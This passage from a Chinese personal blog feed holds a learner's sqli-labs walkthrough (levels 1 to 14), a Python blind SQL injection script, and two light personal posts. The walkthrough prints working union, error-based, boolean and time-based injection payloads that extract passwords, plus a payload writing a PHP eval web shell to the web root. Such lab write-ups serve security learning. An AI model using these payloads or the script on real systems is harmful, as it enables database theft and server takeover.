class="hljs-comment">#基于这个字典循环爆破</span><br>string = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要注入的网址(需包含注入点，并用and连接):&quot;</span>)<span class="hljs-comment">#https://.../?xx=...&#x27;and</span><br>model = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入脚本运行的模式:b~基于bool型的盲注。t~基于时间的盲注。&quot;</span>)<br><span class="hljs-keyword">if</span> model == <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; substr((select group_concat(password) from security.users),&#123;0&#125;,1)=&#123;1&#125; %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">elif</span> model == <span class="hljs-string">&#x27;t&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; if((substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0) %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url + payload)<br>            sec = response.elapsed.seconds<br>            <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error!&quot;</span>)<br></code></pre></div></td></tr></table></figure></li></ul><p>贴一下运行结果,这是第8关的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"></p><p>9、10关更改一下payload即可</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>sql注入</tag>
      
      <tag>py脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的博客满月了！</title>
    <link href="/2021/06/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%BB%A1%E6%9C%88%E4%BA%86%EF%BC%81/"/>
    <url>/2021/06/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%BB%A1%E6%9C%88%E4%BA%86%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<p>我好厉害呀！</p><span id="more"></span><hr><p>当初为什么要搭建这个博客呢        </p><p>（这个博客也不能算我搭的…用的框架，甚至还没自己的服务器…）</p><p>是想着写下我的学习记录，督促自己去学习，甚至还能帮到别人    </p><p>（目前为止写的全是吹水水，别人的博客叫技术博客，我的博客叫QQ空间…）</p><p>目前为止嘛，我做的还行吧    </p><p>（四舍五入就是——我好厉害呀！）</p><hr><p>反正都是写给自己看的玩意，我就是想夸夸自己。</p><hr><p>不过为啥文章这么少呢…</p><p>最近其实学了好多东西，不过还有更多的地方没整明白，不好写技术文…</p><p>也经历了好多事，但忙着学技术也没心思写小作文发牢骚了…</p><hr><p>总结完了，投身祖国的建设比在这逼逼赖赖更重要！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原来分开的日子，你数的这么清楚</title>
    <link href="/2021/06/04/%E5%8E%9F%E6%9D%A5%E5%88%86%E5%BC%80%E7%9A%84%E6%97%A5%E5%AD%90%EF%BC%8C%E4%BD%A0%E6%95%B0%E7%9A%84%E8%BF%99%E4%B9%88%E6%B8%85%E6%A5%9A/"/>
    <url>/2021/06/04/%E5%8E%9F%E6%9D%A5%E5%88%86%E5%BC%80%E7%9A%84%E6%97%A5%E5%AD%90%EF%BC%8C%E4%BD%A0%E6%95%B0%E7%9A%84%E8%BF%99%E4%B9%88%E6%B8%85%E6%A5%9A/</url>
    
    <content type="html"><![CDATA[<p>总在失去之后才学会怀念。</p><span id="more"></span><hr><p>从没想到分开后你会变得这么卑微，能一天天细数着以前的日子。</p><p>那的确是段快乐的时光，我只记得天地辽阔。</p><p>可你像是急着结束。不多一天，没有拖延。</p><p>可你又像是耐心陪伴。不少一天，不斩丝连。</p><p>没想到有天再见时，你打折了。</p><p>都不重要了，我早就找到了替代你的。</p><p>不瞒你说我甚至还找了俩，分别是小Q和小咪。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/deaa625e58edafa80b88abb0a1bb2f2e.jpg"></p><p>说的就是你，网易云</p><p>几块钱的事怎么这么能惦记啊，都快300天了</p><p>（今天打开网易云时的弹窗，有感而发，请对号入座）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210604180917.png"></p><p><strong>主要你这个会员有啥用，会员到期了就听不了会员时下载的歌合理吗</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/v2-a069e19b50660410b414101dc9a48d40_720w.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql_ilabs闯关历程第一页（1~20）</title>
    <link href="/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/"/>
    <url>/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/</url>
    
    <content type="html"><![CDATA[<p>sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文记录我的闯关历程。</p><span id="more"></span><p>由于确实没啥基础，做这个题还是靠网上教程，争取总结到位，有自己的思考。靶场搭建过程略去。</p><hr><h3 id="sql注入常规流程"><a href="#sql注入常规流程" class="headerlink" title="sql注入常规流程"></a>sql注入常规流程</h3><p><em>先附上我在b站看到的一位up主总结的sql注入大体流程</em></p><ul><li><p>判断是否有注入</p><ul><li>可控参数的改变是否能够影响页面显示结果</li><li>输入的sql语句是否能报错——通过数据库的报错，能看到数据库的一些语句痕迹</li><li>输入的sql语句能否不报错——判断我们的语句是否能成功闭合</li></ul></li><li><p>判断是什么类型的注入</p></li><li><p><strong>语句是否能够被恶意修改</strong></p></li><li><p><strong>是否能够成功执行</strong></p></li><li><p>获取我们想要的数据</p><hr><p>在渗透测试中，information_schema库中有三个表对我们很重要。注意：<strong>mysql5.0以上才会有information_schema这个库</strong></p></li><li><p><strong>schemata</strong> 表 中 <strong>schema_name</strong> 字段存储数据库中<strong>所有的库名</strong></p></li></ul><ul><li><strong>tables</strong> 表 中<strong>table_schema</strong> 字段存储<strong>库名</strong> ，<strong>table_name</strong> 字段存储<strong>表名</strong></li></ul><p>    * <strong>columns</strong> 表 中 <strong>table_schema</strong> 字段存储<strong>库名</strong> ，<strong>table_name</strong> 字段存储<strong>表名</strong> ，<strong>column_name</strong> 字段存储<strong>字段名</strong></p><h2 id="通关历程"><a href="#通关历程" class="headerlink" title="通关历程"></a>通关历程</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><p> 完成最简单的sql注入。</p><ul><li><p>输入单双引号，观察报错信息，构造命令，配合<code>%23</code>或<code>--+</code>使语句闭合</p><p>（末尾的%23是#的url编码，#用来注释sql后面的语句使payload闭合。因为如果直接在url中输入#的话，浏览器只会把#号当作位置符号，不会上传到服务器，且服务端会自动对经过url编码后的数据解码）</p></li><li><p>使用 order by 语句判断字段数，接着union select 1,2,…观察能显示的数据</p></li><li><p>构造语句查询数据库的信息,以查询列password和username为例</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询所有的数据库名,查到有“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> %<span class="hljs-number">23</span><br><br>//查询名为“<span class="hljs-keyword">security</span>”的数据库下所有的表名，查到有“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询名为“users”的表下所有的字段名</span><br><span class="hljs-comment">//若不同库下有同名表下同名字段，则查询时where语句后加上 and table_schema=“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">... union <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> security.users %<span class="hljs-number">23</span><br><br>//查询数据库security中uers表的列<span class="hljs-keyword">password</span>和username的所有字段并用‘~’隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p> 输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p><blockquote><p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png" alt="img"></a></p><p> <em>———查询有关double injection的详细信息请点击这里<a href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p></blockquote><p>第一步完全一致，第二步不再用<code>select 1,2...</code>来观察回显，最多可用<code>order by</code>得到<code>union select</code> 的字段数。第三步中语句<code>union select...</code>后面拼接<code>concat((select...)</code>语句，两个select组成双查询。</p><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数</p></li><li><p>构造语句查询数据库的信息<strong>（注意：group_concat函数在这里失效了，故没使用）</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br><br>//查询当前数据库,得知当前数据库为‘security’，如要查别的数据库就<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>，直到<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>查到我们需要的表名，如“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//同样<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>知道查到列名username和<span class="hljs-keyword">password</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//查询security.users下第一行的username和<span class="hljs-keyword">password</span>并用“~”隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p> 这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不再显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p><p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png" alt="img"></a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png" alt="img"></a></p><p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里提供一个<a href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png" alt="img"></a></p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png" alt="img"></a></p><p>因为是直接上传了木马，连接成功的话就能直接控制服务器了。</p><hr><h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p> 这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了报错信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p><p>盲注又大概分为布尔型和时间型，其中第8关是布尔型，9、10关是时间型。</p><p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p><p>接下来我会从手注并配合python脚本的方式来完成。</p><p>第8关：</p><ul><li><p>输入单双引号，观察显示信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数（能行但没用）</p><p>因为显示的信息只有两种情况，语句正确时显示一句话”You are in…“,语句错误时没有显示。我们就只能利用这个信息，靠猜的方式去完成注入。这就是使用基于bool类型的注入。</p><p>就像这样：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 5 --+，无显示 (显示异常)</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">6</span> <span class="hljs-comment">--+，显示“you are in...”（显示正常）</span><br>输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 7 --+，显示异常</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">8</span> <span class="hljs-comment">--+，显示正常</span><br>//说明数据库名长度为<span class="hljs-number">8</span>个字符。<br></code></pre></div></td></tr></table></figure><p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure><p>下面是关于用脚本解决的部分。</p><p>关于脚本的编写请见我这一篇文章，传送门：<a href="https://eggswoo.com/2021/06/16/py-script-sql-injection/">用python编写一个sql注入脚本 - 蛋窝窝 (eggswoo.com)</a></p><p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p><p>payload:查找security.users中的password</p><p>对应运行结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png" alt="img"></a></p><p>9、10关：</p><p> 因为无论传什么参数结果界面都完全不变，视觉上没有任何信息。所以采用基于时间的盲注方法。</p></li></ul><p> 判断语句是否闭合就需要用到sleep函数</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">输入...id=<span class="hljs-number">1</span><span class="hljs-string">&quot; and sleep(5) %23//页面很快有反应，sleep函数没能生效，证明语句闭合失败输入...id=1&#x27; and sleep(5) %23//等待5秒后页面刷新，证明语句闭合成功 </span><br></code></pre></div></td></tr></table></figure><p>开始构造payload</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">.../?id=<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;and</span> <span class="hljs-keyword">if</span>(database()=<span class="hljs-symbol">&#x27;security</span>&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<span class="hljs-comment">--+</span><br>//同样页面延迟了<span class="hljs-number">5</span>秒刷新，证明当前数据库名为security<br></code></pre></div></td></tr></table></figure><p>最后贴上用脚本的截图</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png" alt="img"></a></p><hr><h3 id="11-12"><a href="#11-12" class="headerlink" title="11~12"></a>11~12</h3><p> 从这里开始由get类型的注入转变为post类型的注入。之前都是可以直接在浏览器地址栏进行的get类型的注入，而通常post传送的数据不能在url上看到，只能通过抓包工具(burpsuite)或者浏览器插件（hackbar）进行查看。无论我们在他给出的登录框怎么输入，上面的url地址栏都不会产生变化。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0[%7DF[P%7BHGS9$L%60ZUP9G8S8B.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" alt="img"></a></p><p>而我们在输入框中输入的数据即为post上传的数据。</p><p>当我在username栏末尾输入‘时报错。从这个报错语句中即可以看出这里的sql语句是以单引号闭合的。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png" alt="img"></a></p><p>这里的username和password都是注入点，任选一个都可以使用语句注入。</p><ul><li>输入单双引号，观察报错信息，构造命令使语句闭合</li><li>使用 order by 语句判断字段数</li><li>构造语句查询数据库的信息</li></ul><p>所有步骤和1~4关的都一样，只是注入方式由get变为post,我们输入的工具语句也由在url中输入变为在表单中输入。另外注释符用#而不是%23，因为我们输入的语句不再经过浏览器url解析，可以直接上传到服务器中了。</p><p>12就是语句双引号加单小括号闭合，注入方法不变。</p><hr><h3 id="13-14"><a href="#13-14" class="headerlink" title="13-14"></a>13-14</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">这两关名字叫做<span class="hljs-built_in">post</span>类型的双重注入，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。通过报错信息闭合语句并查询完字段数后，根据前<span class="hljs-number">5</span>~<span class="hljs-number">6</span>关<span class="hljs-built_in">get</span>类型的双重注入经验可先按照以往<span class="hljs-built_in">get</span>类型的双重注入来尝试，果然成功了。<br></code></pre></div></td></tr></table></figure><p>语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a #<br></code></pre></div></td></tr></table></figure><p>对应结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png"><img 